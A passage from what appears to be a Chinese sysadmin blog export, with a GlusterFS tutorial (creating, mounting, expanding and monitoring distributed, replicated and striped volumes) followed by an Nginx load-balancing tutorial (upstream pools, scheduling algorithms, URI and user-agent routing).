-y验证glusterfs -V截止目前版本为: v3.10.5启动Glusterdsystemctl start glusterdsystemctl status glusterd Trusted Storage Pools可信存储池-【在server1配置】1234在开始创建ClusterFS卷之前，需要创建一个称之为Trusted Storage的池，是一个可信的网络存储服务器，可以理解为集群。为卷提供bricks。格式: gluster peer probe&lt;主机名或者IP地址&gt;建议是IP地址，或者内网用DNS做主机名解析，或者在&#x2F;etc&#x2F;hosts做好绑定。 12345678910111213141516171819例如要创建一个包含3个服务器的存储池，则需要从第一个服务器server1中把另外两个服务器加入存储池中(不要添加server1服务器，默认就已经添加了的)。#配置peer[root@gserver1 ~]# gluster peer probe 192.168.56.102[root@gserver1 ~]# gluster peer probe 192.168.56.103注：之后横向扩展，把服务器也加入这个存储池即可。查看存储池状态(可以在已加入可信存储池的任一服务器查看状态)：[root@gserver1 ~]# gluster peer statusNumber of Peers: 2Hostname: 192.168.56.102Uuid: 91d7b5e7-f5f8-4111-b90a-05ea71b10e1eState: Peer in Cluster (Connected)Hostname: 192.168.56.103Uuid: 1cc01e69-948c-4876-a8be-4ab5e3b85681State: Peer in Cluster (Connected) 123从存储池移除服务器假设需要将服务器从存储池移除，可以使用以下命令：gluster peer detach 192.168.56.103 GlusterFS逻辑卷(Volume)创建1. 创建分布式卷12特点：基于 Hash 算法将文件分布到所有 brick server，只是扩大了磁盘空间，不具备容错能力。由于distribute volume 使用本地文件系统，因此存取效率并没有提高，相反会因为网络通信的原因使用效率有所降低，另外本地存储设备的容量有限制，因此支持超大型文件会有一定难度。 创建Distributed逻辑卷 1234567891011121314151617181920212223242526272829【server1配置】在独立挂载的磁盘&#x2F;data&#x2F;A上创建一个名字为dis-volume逻辑卷[root@gserver1 ~]# gluster volume create dis-volume 192.168.56.101:&#x2F;data&#x2F;A 192.168.56.102:&#x2F;data&#x2F;A 192.168.56.103:&#x2F;data&#x2F;A force查看卷[root@gserver1 ~]# gluster volume info dis-volumeVolume Name: dis-volume #卷名称Type: Distribute #此处会显示卷的类型Volume ID: f5adb5a0-28cd-4d65-a77e-4d4e25c51db4 #分布式卷IDStatus: Created #状态created,卷不启动将无法使用卷Snapshot Count: 0Number of Bricks: 3Transport-type: tcpBricks:Brick1: 192.168.56.101:&#x2F;data&#x2F;ABrick2: 192.168.56.102:&#x2F;data&#x2F;ABrick3: 192.168.56.103:&#x2F;data&#x2F;AOptions Reconfigured:transport.address-family: inetnfs.disable: on启动卷[root@gserver1 ~]# gluster volume start dis-volumevolume start: dis-volume: success再次查看卷状态[root@gserver1 ~]# gluster volume info dis-volumeStartus: Started #可以看到，卷已经启动 客户端client-挂载使用 12345678910 #创建挂载目录[root@gluster_client ~]# mkdir &#x2F;mnt&#x2F;dis -p#挂载使用[root@gluster_client ~]# mount.glusterfs 192.168.56.101:dis-volume &#x2F;mnt&#x2F;dis&#x2F; [root@gluster_client ~]# df -hFilesystem Size Used Avail Use% Mounted on192.168.56.101:dis-volume 30G 109M 28G 1% &#x2F;mnt&#x2F;dis注：挂载的时候,可以使用任意一台已经加入到可信存储池并且创建了对应卷的server地址 Distributed逻辑卷-文件存储测试 123[root@gluster_client ~]# cd &#x2F;mnt&#x2F;dis&#x2F;[root@gluster_client dis]# touch dis_test&#123;1..6&#125;.txt[root@gluster_client dis]# ll server tree测试 123456789101112131415161718192021#server1存储的文件[root@gserver1 ~]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A├── dis_test1.txt├── dis_test2.txt├── dis_test3.txt├── dis_test5.txt├── dis_test6.txt#server2存储的文件[root@gserver2 ~]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A├── dis_test4.txt#server3存储的文件[root@gserver3 ~]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A└── 由此可以得出结论,分布式卷存储没有副本，倘若其中一台服务器挂掉，这台gluster服务器数据,便会丢失。 2. 创建复制卷复制卷架构示意图 1特点：文件同步复制到多个 brick 上，文件级 RAID1，具有容错能力，写性能下降，读性能提升。Replicated 模式，也称作 AFR（Auto File Replication），相当于 RAID1，即同一文件在多个镜像存储节点上保存多份，每个 replicated 子节点有着相同的目录结构和文件，replica volume 也是在容器存储中较为推崇的一种。 12345测试之前，我们先删除刚才创建的分布式卷[root@gserver1 ~]# gluster volume stop dis-volume #必须先停止卷，然后再删除卷[root@gserver1 ~]# gluster volume delete dis-volume并清空三台服务器&#x2F;data&#x2F;A目录下的内容 1234567# 创建卷test-volume[root@gserver1 A]# gluster volume create test-volume replica 3 transport tcp 192.168.56.101:&#x2F;data&#x2F;A 192.168.56.102:&#x2F;data&#x2F;A 192.168.56.103:&#x2F;data&#x2F;A force其中,replica 3 意思是一份数据存储1x3&#x3D;3份副本, 因为我的服务器一共是3台，这样的话可以指定数量为3或6或9以此类推。但如果服务器数量是2台，则可以设置的副本数为2或4或6或8,总之是服务器数量的倍数即可。否则会报命令格式的错误。replica意思是副本。transport tcp 使用TCP协议 12345678启动卷[root@gserver1 ~]# gluster volume start test-volumevolume start: test-volume: success再次查看卷状态[root@gserver1 ~]# gluster volume info test-volumeNumber of Bricks: 1 x 3 &#x3D; 3 #可以看到我们刚才提到的副本数量Transport-type: tcp # 协议使用TCP 客户端client-挂载使用 123456789 #创建挂载目录[root@gluster_client ~]# mkdir &#x2F;mnt&#x2F;test -p#挂载使用[root@gluster_client ~]# mount.glusterfs 192.168.56.101:test-volume &#x2F;mnt&#x2F;test&#x2F; [root@gluster_client ~]# df -hFilesystem Size Used Avail Use% Mounted on192.168.56.101:test-volume 9.8G 37M 9.2G 1% &#x2F;mnt&#x2F;test注：挂载的时候,可以使用任意一台已经加入到可信存储池并且创建了对应卷的server地址 Distributed逻辑卷-文件存储测试 123[root@gluster_client ~]# cd &#x2F;mnt&#x2F;test&#x2F;[root@gluster_client dis]# touch test&#123;1..6&#125;.txt[root@gluster_client dis]# ll server tree测试 12345678910111213141516171819202122232425262728293031#server1测试[root@gserver1 test]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A├── test1.txt├── test2.txt├── test3.txt├── test4.txt├── test5.txt└── test6.txt#server2测试[root@gserver2 test]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A├── test1.txt├── test2.txt├── test3.txt├── test4.txt├── test5.txt└── test6.txt#server3测试[root@gserver3 test]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A├── test1.txt├── test2.txt├── test3.txt├── test4.txt├── test5.txt└── test6.txt总结：由测试结果可以看出，数据存储副本数量与架构图所示一致，该模式下，倘若某一台机器坏掉，数据还有2份 3. 创建条带卷12特点：类似 RAID0，文件分成数据块以 Round Robin 方式分布到 brick server 上，并发粒度是数据块，支持超大文件，大文件的读写性能高。 12345测试之前，我们先删除刚才创建的分布式卷[root@gserver1 ~]# gluster volume stop test-volume #必须先停止卷，然后再删除卷[root@gserver1 ~]# gluster volume delete test-volume并清空三台服务器&#x2F;data&#x2F;A目录下的内容 123456789101112131415161718192021222324#创建条带卷stri-volume[root@gserver1 A]# gluster volume create stri-volume stripe 4 transport tcp 192.168.56.10:&#x2F;data&#x2F;A 192.168.56.101:&#x2F;data&#x2F;A 192.168.56.102:&#x2F;data&#x2F;A 192.168.56.103:&#x2F;data&#x2F;A force启动卷[root@gserver1 ~]# gluster volume start stri-volumevolume start: stri-volume: success再次查看卷状态[root@gserver1 ~]# gluster volume info stri-volumeVolume Name: stri-volumeType: Stripe #类型:条带卷Volume ID: a8745aae-d5a1-4093-a163-4db5687d575bStatus: StartedSnapshot Count: 0Number of Bricks: 1 x 4 &#x3D; 4Transport-type: tcpBricks:Brick1: 192.168.56.10:&#x2F;data&#x2F;ABrick2: 192.168.56.101:&#x2F;data&#x2F;ABrick3: 192.168.56.102:&#x2F;data&#x2F;ABrick4: 192.168.56.103:&#x2F;data&#x2F;AOptions Reconfigured:transport.address-family: inetnfs.disable: on 客户端client-挂载使用 12345678910 #创建挂载目录[root@gluster_client ~]# mkdir &#x2F;mnt&#x2F;stri -p#挂载使用[root@gluster_client ~]# mount.glusterfs 192.168.56.101:stri-volume &#x2F;mnt&#x2F;stri&#x2F; [root@gluster_client ~]# df -hFilesystem Size Used Avail Use% Mounted on192.168.56.101:stri-volume 30G 109M 28G 1% &#x2F;mnt&#x2F;stri注：挂载的时候,可以使用任意一台已经加入到可信存储池并且创建了对应卷的server地址 Distributed逻辑卷-文件存储测试 123[root@gluster_client ~]# cd &#x2F;mnt&#x2F;stri&#x2F;[root@gluster_client dis]# touch stri&#123;1..6&#125;.txt[root@gluster_client dis]# ll server tree测试 1234567891011121314151617181920212223242526[root@gserver1 ~]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A├── stri1.txt├── stri2.txt├── stri3.txt├── stri4.txt├── stri5.txt└── stri6.txt[root@gserver2 ~]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A├── stri1.txt├── stri2.txt├── stri3.txt├── stri4.txt├── stri5.txt└── stri6.txt[root@gserver3 ~]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A├── stri1.txt├── stri2.txt├── stri3.txt├── stri4.txt├── stri5.txt└── stri6.txt 4. 创建分布式+复制卷（推荐）12特点：Brick server 数量是镜像数的倍数，兼具 distribute 和 replica 卷的特点,可以在 2 个或多个节点之间复制数据。分布式的复制卷，volume 中 brick 所包含的存储服务器数必须是 replica 的倍数(&gt;&#x3D;2倍)，兼顾分布式和复制式的功能。 分布式复制卷架构示意图： 12345测试之前，我们先删除刚才创建的分布式卷[root@gserver1 ~]# gluster volume stop dis-volume #必须先停止卷，然后再删除卷[root@gserver1 ~]# gluster volume delete dis-volume并清空三台服务器&#x2F;data&#x2F;A目录下的内容 1234# 创建卷test-volume[root@gserver1 A]# gluster volume create test1-volume replica 2 transport tcp 192.168.56.10:&#x2F;data&#x2F;A 192.168.56.101:&#x2F;data&#x2F;A 192.168.56.102:&#x2F;data&#x2F;A 192.168.56.103:&#x2F;data&#x2F;A force注：此处使用的是4台服务器的&#x2F;data&#x2F;A目录来创建分布式+复制（综合）卷 1234567891011121314151617181920启动卷[root@gserver1 ~]# gluster volume start test1-volumevolume start: test1-volume: success再次查看卷状态Volume Name: test1-volumeType: Distributed-ReplicateVolume ID: 7ef157ef-5d51-492c-9e85-cf4e583a9903Status: StartedSnapshot Count: 0Number of Bricks: 2 x 2 &#x3D; 4Transport-type: tcpBricks:Brick1: 192.168.56.10:&#x2F;data&#x2F;ABrick2: 192.168.56.101:&#x2F;data&#x2F;ABrick3: 192.168.56.102:&#x2F;data&#x2F;ABrick4: 192.168.56.103:&#x2F;data&#x2F;AOptions Reconfigured:transport.address-family: inetnfs.disable: on 客户端client-挂载使用 12345678910 #创建挂载目录[root@gluster_client ~]# mkdir &#x2F;mnt&#x2F;test1 -p#挂载使用[root@gluster_client ~]# mount.glusterfs 192.168.56.101:test1-volume &#x2F;mnt&#x2F;test1&#x2F; [root@gluster_client ~]# df -hFilesystem Size Used Avail Use% Mounted on192.168.56.101:test1-volume 20G 73M 19G 1% &#x2F;mnt&#x2F;test1注：挂载的时候,可以使用任意一台已经加入到可信存储池并且创建了对应卷的server地址 测试结果： 123456789101112131415161718192021222324252627[root@gluster_client ~]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A├── haha10.conf├── haha1.conf├── haha2.conf├── haha3.conf├── haha4.conf├── haha5.conf├── haha6.conf├── haha7.conf├── haha8.conf└── haha9.conf[root@gserver1 test1]# tree &#x2F;data&#x2F;A&#x2F;data&#x2F;A├── haha10.conf├── haha1.conf├── haha2.conf├── haha3.conf├── haha4.conf├── haha5.conf├── haha6.conf├── haha7.conf├── haha8.conf└── haha9.conf另外2台服务器&#x2F;data&#x2F;A没有数据，由此可以总结为分布式复制卷类似于RIAD1,有备份冗余功能，但磁盘利用率低。 5. 创建分布式+条带卷12特点：Brick server 数量是条带数的倍数，兼具 distribute 和 stripe 卷的特点。分布式的条带卷，volume 中 brick 所包含的存储服务器数必须是 stripe 的倍数(&gt;&#x3D;2倍)，兼顾分布式和条带式的功能。每个文件分布在四台共享服务器上，通常用于大文件访问处理，最少需要 4 台服务器才能创建分布条带卷。 6. stripe replica volume条带复制卷1特点：类似 RAID 10，同时具有条带卷和复制卷的特点。 7. distribute stripe replica volume分布式条带复制卷1特点：三种基本卷的复合卷，通常用于类 Map Reduce 应用。 Docker GlusterFS Volume 插件123Docker Volume是一种可以将容器以及容器生产的数据分享开来的数据格式，我们可以使用宿主机的本地存储作为Volume的提供方，也可以使用Volume Plugin接入许多第三方的存储。 GitHub就有一个Docker GlusterFS Volume Plugin，方便我们将GlusterFS挂载到容器中。GitHub:https:&#x2F;&#x2F;github.com&#x2F;calavera&#x2F;docker-volume-glusterfs 安装Docker GlusterFS Volume 插件 1234567891011121314# (1). 获取docker-volume-glusterfsgo get github.com&#x2F;calavera&#x2F;docker-volume-glusterfs考虑到搭建golang环境有一定的复杂性，我们也可以采用golang容器来获取该应用 # (2). 拷贝docker-volume-glusterfs至&#x2F;usr&#x2F;bincp .&#x2F;docker-volume-glusterfs &#x2F;usr&#x2F;binchmod 777 &#x2F;usr&#x2F;bin&#x2F;docker-volume-glusterfs # (3). 声明gluster服务集群docker-volume-glusterfs -servers node1:node2 # (4). 指定volumedocker run --volume-driver glusterfs --volume datastore:&#x2F;data alpine touch &#x2F;data&#x2F;hello这里的datastore即我们在glusterfs集群中创建的volume，但需要事先手动创建 管理GlusterFS卷12345678#停止卷[root@linux-node1 ~]# gluster volume stop test1-volume#启动卷[root@linux-node1 ~]# gluster volume start test1-volume#删除卷[root@linux-node1 ~]# gluster volume delete test1-volume 扩展卷（GlusterFS支持在线进行卷的扩展） 1234567891011#加入可信任存储池[root@linux-node3 data]# gluster peer probe 192.168.56.30peer probe: success#添加brick[root@linux-node3 data]# gluster volume add-brick test1-volume 192.168.56.30:&#x2F;data&#x2F;A forcevolume add-brick: success#查看卷信息[root@linux-node3 data]# gluster volume info test1-volumeVolume Name: test1-volume 收缩卷 1234567891011121314151617收缩卷和扩展卷相似据以Brick为单位。#移除brick[root@linux-node3 data]# gluster volume remove-brick test1-volume 192.168.56.30:&#x2F;data&#x2F;A startvolume remove-brick start: successID: 15764d05-5675-46b5-8467-b9eb12570e61#查看该节点brick状态[root@linux-node3 data]# gluster volume remove-brick test1-volume 192.168.56.30:&#x2F;data&#x2F;A status#提交更改[root@linux-node3 data]# gluster volume remove-brick test1-volume 192.168.56.30:&#x2F;data&#x2F;A commitRemoving brick(s) can result in data loss. Do you want to Continue? (y&#x2F;n) yvolume remove-brick commit: success#查看卷状态信息[root@linux-node3 data]# gluster volume info test1-volume 迁移卷 12345678910进行卷迁移前需要确保迁移目标已经加入集群。或者迁移的Brick目录存在。迁移卷可以执行暂停和中止的操作。#迁移gluster volume replace-brick test1-volume 192.168.56.30:&#x2F;data&#x2F;A 192.168.56.30:&#x2F;data&#x2F;B commit force#暂停迁移gluster volume replace-brick test1-volume 192.168.56.30:&#x2F;data&#x2F;A 192.168.56.30:&#x2F;data&#x2F;B pause#中止迁移gluster volume replace-brick test1-volume 192.168.56.30:&#x2F;data&#x2F;A 192.168.56.30:&#x2F;data&#x2F;B abort 替换brick 1234567891011121314gluster volume replace-brick VOLNAME BRICKNEW-BRICK start&#x2F;pause&#x2F;abort&#x2F;status&#x2F;commitgluster volume replace-brick dht_vol server0:&#x2F;mnt&#x2F;sdb1 server0:&#x2F;mnt&#x2F;sdc1 start&#x2F;&#x2F;如上server0上的&#x2F;mnt&#x2F;sdb1替换到server0的&#x2F;mnt&#x2F;sdc1，执行replcace-brick卷替换启动命令，使用start启动命令后，开始将原始Brick的数据迁移到即将需要替换的Brick上。gluster volume replace-brick dht_vol server0:&#x2F;mnt&#x2F;sdb1 server0:&#x2F;mnt&#x2F;sdc1 status&#x2F;&#x2F;在数据迁移的过程中，可以查看替换任务是否完成。gluster volume replace-brick dht_vol server0:&#x2F;mnt&#x2F;sdb1 server0:&#x2F;mnt&#x2F;sdc1 abort&#x2F;&#x2F;在数据迁移的过程中，可以执行abort命令终止Brick替换。gluster volume replace-brick dht_vol server0:&#x2F;mnt&#x2F;sdb1 server0:&#x2F;mnt&#x2F;sdc1 commit&#x2F;&#x2F;在数据迁移结束之后，执行commit命令结束任务，则进行Brick替换。使用volume info命令可以查看到Brick已经被替换。 系统配额 12345678910111213141516171819202122232425开启&#x2F;关闭系统配额gluster volume quota VOLNAME enable&#x2F;disable&#x2F;&#x2F;在使用系统配额功能时，需要使用enable将其开启；disable为关闭配额功能命令。设置(重置)目录配额gluster volume quota VOLNAME limit-usage &#x2F;directory limit-valuegluster volume quota dht_vol limit-usage &#x2F;quota 10GB&#x2F;&#x2F;如上，设置dht_vol卷下的quota子目录的限额为10GB。PS：这个目录是以系统挂载目录为根目录”&#x2F;”,所以&#x2F;quota即客户端挂载目录下的子目录quota配额查看gluster volume quota VOLNAME listgluster volume quota VOLNAME list &#x2F;directory name&#x2F;&#x2F;可以使用如上两个命令进行系统卷的配额查看，第一个命令查看目的卷的所有配额设置，第二个命令则是执行目录进行查看。可以显示配额大小及当前使用容量，若无使用容量(最小0KB)则说明设置的目录可能是错误的(不存在)。地域复制(geo-replication)gluster volume geo-replication MASTER SLAVE start&#x2F;status&#x2F;stop地域复制是系统提供的灾备功能，能够将系统的全部数据进行异步的增量备份到另外的磁盘中。gluster volume geo-replication dht_vol 192.168.2.104:&#x2F;mnt&#x2F;sdb1 start &#x2F;&#x2F;如上，开始执行将dht_vol卷的所有内容备份到2.104下的&#x2F;mnt&#x2F;sdb1中的task，需要注意的是，这个备份目标不能是系统中的Brick。 I/O信息查看 1234567891011Profile Command 提供接口查看一个卷中的每一个brick的IO信息。注：把下面的VOLNAME改为实际的volume名称，比如:stri-volumegluster volume profile VOLNAME start&#x2F;&#x2F;启动profiling，之后则可以进行IO信息查看gluster volume profile VOLNAME info&#x2F;&#x2F;查看IO信息，可以查看到每一个Brick的IO信息gluster volume profile VOLNAME stop&#x2F;&#x2F;查看结束之后关闭profiling功能 Top监控 12345678910111213141516171819202122Top command 允许你查看bricks的性能例如：read, write, file open calls, file read calls, file write calls, directory open calls, and directory real calls所有的查看都可以设置top数，默认100gluster volume top VOLNAME open [brick BRICK-NAME] [list-cnt cnt]&#x2F;&#x2F;查看打开的fdgluster volume top VOLNAME read [brick BRICK-NAME] [list-cnt cnt]&#x2F;&#x2F;查看调用次数最多的读调用gluster volume top VOLNAME write [brick BRICK-NAME] [list-cnt cnt]&#x2F;&#x2F;查看调用次数最多的写调用gluster volume top VOLNAME opendir [brick BRICK-NAME] [list-cnt cnt]&#x2F;&#x2F;查看次数最多的目录调用gluster volume top VOLNAME readdir [brick BRICK-NAME] [list-cnt cnt]&#x2F;&#x2F;查看每个Brick的读性能gluster volume top VOLNAME read-perf [bs blk-size count count] [brick BRICK-NAME] [list-cnt cnt]&#x2F;&#x2F;查看每个Brick的写性能gluster volume top VOLNAME write-perf [bs blk-size count count] [brick BRICK-NAME] [list-cnt cnt] 客户端挂载1GlusterFS支持三种客户端类型。Gluster Native Client、NFS和CIFS。官方推荐使用Native Client，可以使用GlusterFS的全部功能。 Gluster Native Client 12345Gluster Native Client是基于FUSE的，所以需要保证客户端安装了FUSE。这个是官方推荐的客户端，支持高并发和高效的写性能。[root@linux-node4 ~]# yum -y install glusterfs-client[root@linux-node4 ~]# mkdir &#x2F;mnt&#x2F;test[root@linux-node4 ~]# mount.glusterfs 192.168.56.102:&#x2F;test1-volume &#x2F;mnt&#x2F;test 1234567891011121314151617181920挂载参数：当使用mount –t glusterfs的使用，可以执行相关的参数如下：backupvolfile-server&#x3D;server-namevolfile-max-fetch-attempts&#x3D;number of attemptslog-level&#x3D;loglevellog-file&#x3D;logfiletransport&#x3D;transport-typedirect-io-mode&#x3D;[enable|disable]挂载示例：mount -t glusterfs -o backupvolfile-server&#x3D;volfile_server2 --volfile-max-fetch-attempts&#x3D;2 log-level&#x3D;WARNING,log-file&#x3D;&#x2F;var&#x2F;log&#x2F;gluster.log server1:&#x2F;test-volume &#x2F;mnt&#x2F;test 注：(1)gluster 的提供option叫backup-volfile-server和backup-volfile-servers，达到挂载时候可以指定多个读取卷配置服务器。mount -t glusterfs -o backup-volfile-server&#x3D;gluster2 gluster1:&#x2F;volume &#x2F;mntmount -t glusterfs -o backup-volfile-servers&#x3D;gluster2:gluster3:gluster4 gluster1:&#x2F;volume &#x2F;mnt意思是如果gluster1连接失败，会去gluster2等去取卷配置信息。(2)--volfile-max-fetch-attempts&#x3D;X optionspecify the number of attempts to fetch volume files while mounting a volume. This option is useful when you mount a server with multiple IP addresses or when round-robin DNS is configured for the server-name.. NFS挂载 123NFS默认是使用的UDP进行通信，由于GlusterFS不支持UDP。所以需要设置为TCP的方式挂载。mount -o mountproto&#x3D;tcp -t nfs server1:&#x2F;test-volume &#x2F;mnt&#x2F;test 基于GlusterFS实现MySQL数据持久化 参考：IBM developerworks","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"分布式存储","slug":"分布式存储","permalink":"https://garywu520.github.io/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E5%AD%98%E5%82%A8/"},{"name":"GlusterFS","slug":"GlusterFS","permalink":"https://garywu520.github.io/tags/GlusterFS/"},{"name":"SAN","slug":"SAN","permalink":"https://garywu520.github.io/tags/SAN/"},{"name":"NAS","slug":"NAS","permalink":"https://garywu520.github.io/tags/NAS/"}]},{"title":"Nginx负载均衡","slug":"Nginx负载均衡","date":"2017-09-23T06:38:11.000Z","updated":"2017-10-14T03:57:33.268Z","comments":true,"path":"2017/09/23/Nginx负载均衡/","link":"","permalink":"https://garywu520.github.io/2017/09/23/Nginx%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/","excerpt":"集群分类 123451.负载均衡集群LB 硬件实现负载：F5硬件设备、A10硬件设备 软件实现负载：LVS（4层负载均衡）&#x2F; HAproxy(4层&#x2F;7层负载均衡) 2. 高可用集群HA3. 网络集群","text":"集群分类 123451.负载均衡集群LB 硬件实现负载：F5硬件设备、A10硬件设备 软件实现负载：LVS（4层负载均衡）&#x2F; HAproxy(4层&#x2F;7层负载均衡) 2. 高可用集群HA3. 网络集群 负载均衡作用 121. 对用户的访问请求进行调度管理2. 对用户的访问请求进行压力分担 反向代理与数据转发的区别 nginx反向代理-部署 web服务器配置 1在多台web服务器部署nginx服务并完成测试访问 upstream配置 1234567891011121314151617upstream模块：ngx_http_upstream_module 类似于一个池，将nginx节点放入池中proxy_pass模块：ngx_http_proxy_module 用来调用upstream定义的名称在http区域内定义负载池 upstream server_pools &#123; server 10.0.0.7:80 weight&#x3D;3 max_fails&#x3D;3 fail_timeout; server 10.0.0.8:80 weight&#x3D;1 max_fails&#x3D;3 fail_timeout backup; &#125; server &#123; #配置负载虚拟主机bbs listen 80; server_name bbs.etiantian.org; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;server_pools; &#125; upstream模块 12345678upstream模块功能： ①定义后端可调剂节点信息 ②实现权重值负载访问功能-如：weight&#x3D;2 ③定义后端访问的失败次数，失败后就访问下一台服务器-如：max_fails&#x3D;3 ③定义后端访问失败重试超时时间，超过超时时间会重新请求此服务器-如：fail_timeout&#x3D;10 ④当集群中的负载节点服务器都挂了的情况下，使用热备节点,即backup 注：使用weight和backup时，不能使用ip_hash算法。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546upstream调度算法： ①定义轮询调度算法- rr(默认调度算法) ②定义权重调度算法- wrr ③定义静态调度算法-ip_hash 对用户源公网IP进行hash计算 ④定义最小的连接数-least_conn 注：IP_hash会造成负载不均的问题，但可以使用redis缓存去记录session来解决问题 示例：1、轮询（默认） 每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。 2、weight 指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。 例如： upstream bakend &#123; server 192.168.0.14 weight&#x3D;10; server 192.168.0.15 weight&#x3D;10; &#125; 3、ip_hash 每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。 例如： upstream bakend &#123; ip_hash; server 192.168.0.14:88; server 192.168.0.15:80; &#125; 4、fair（第三方） 按后端服务器的响应时间来分配请求，响应时间短的优先分配。 upstream backend &#123; server server1; server server2; fair; &#125; 5、url_hash（第三方） 按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。 例：在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法 upstream backend &#123; server squid1:3128; server squid2:3128; hash $request_uri; hash_method crc32; &#125; proxy_pass模块 12345678910111213141516server &#123; listen 80; server_name www.etiantian.org; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;server_pools; proxy_set_header host $host; proxy_set_header X-Forwarded-For $remote_addr; &#125; &#125; 其中,proxy_set_header host $host; 把用户访问的host头部信息改为用户输入的host域名信息因为在upstream负载模式下，HTTP应用层-抓包过程可以看到，nginx前端负载服务器到nginx后端机的数据包头部，host信息为upstream池的名称proxy_set_header X-Forwarded-For $remote_addr； #显示访问客户端的真实源IP地址注：需要提前在nginx.conf日志格式(log_format)区域中定义 12345678910111213141516171819202122232425262728293031323334nginx负载机器上进行如下配置：worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; upstream server_pools &#123; server 10.0.0.7:80; server 10.0.0.8:80; &#125; server &#123; listen 80; server_name bbs.etiantian.org; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;server_pools; proxy_set_header host $host; proxy_set_header X-Forwarded-For $remote_addr; &#125; &#125; server &#123; listen 80; server_name www.etiantian.org; location &#x2F; &#123; proxy_pass http:&#x2F;&#x2F;server_pools; proxy_set_header host $host; proxy_set_header X-Forwarded-For $remote_addr; &#125; &#125;&#125; 基于URI进行转发-实现动静资源访问分离 123456例如：&#x2F;upload 10.0.0.8:80&#x2F;static 10.0.0.7:80&#x2F; 10.0.0.9:80nginx配置文件中location区域类似判断功能，如果什么什么则怎样。 负载均衡服务器配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; log_format main &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39; &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39; &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;; upstream upload_pools &#123; #定义一个upload后端集群池 server 10.0.0.8:80; &#125; upstream static_pools &#123; #定义一个static后端集群池 server 10.0.0.7:80; &#125; upstream default_pools &#123; #定义一个默认后端集群池 server 10.0.0.9:80; &#125;server &#123; listen 80; server_name www.etiantian.org; location &#x2F;static&#x2F; &#123; #当用户访问static下的URI时 proxy_pass http:&#x2F;&#x2F;static_pools; #调用对应后端集群池static_pools proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; &#125; location &#x2F;upload&#x2F; &#123; #当用户访问upload下的URI时 proxy_pass http:&#x2F;&#x2F;upload_pools; #调用对应后端集群池upload_pools proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; &#125; location &#x2F; &#123; #当用户访问&#x2F;下的URI时 proxy_pass http:&#x2F;&#x2F;default_pools; #调用对应后端集群池default_pools proxy_set_header Host $host; proxy_set_header X-Forwarded-For $remote_addr; &#125; access_log logs&#x2F;access_www.log main; &#125;&#125;注：如果location判断不匹配，则默认匹配显示默认的&#x2F;所对应的后端集群池中服务器站点信息 403错误可能 121. 网站根目录没有指定的index.html或index.php文件2. 服务器限制了用户访问 手机与电脑访问页面显示不同界面-实现 12根据用户不同的浏览器客户端进行转发 lb01负载均衡配置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546worker_processes 1;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; default_type application&#x2F;octet-stream; sendfile on; keepalive_timeout 65; log_format main &#39;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#39; &#39;$status $body_bytes_sent &quot;$http_referer&quot; &#39; &#39;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#39;; upstream upload_pools &#123; server 10.0.0.8:80;&#125;upstream static_pools &#123; server 10.0.0.7:80;&#125;upstream default_pools &#123; server 10.0.0.9:80;&#125; server &#123; listen 80; server_name www.etiantian.org; location &#x2F; &#123; proxy_set_header Host $host; if ($http_user_agent ~* &quot;Android&quot;) #判断是Android手机，则请求static_pools后端集群 &#123; proxy_pass http:&#x2F;&#x2F;static_pools; &#125; if ($http_user_agent ~* &quot;iPhone&quot;) #判断是iPhone手机，则请求static_pools后端集群 &#123; proxy_pass http:&#x2F;&#x2F;upload_pools; &#125; proxy_pass http:&#x2F;&#x2F;default_pools; #判断如果都不匹配，则请求默认后端集群 &#125; access_log logs&#x2F;access_www.log main; &#125;&#125;注：proxy_set_header Host $host; 不能放在if区域内~* 表示不区分大小写 centos模拟手机客户端访问网址 12345curl -A &quot;iphone&quot; www.etiantian.org&#x2F;nana.htmlcurl -A &quot;android&quot; www.etiantian.org&#x2F;nana.html curl -A &quot;djfljlfjsljf&quot; www.etiantian.org&#x2F;nana.html 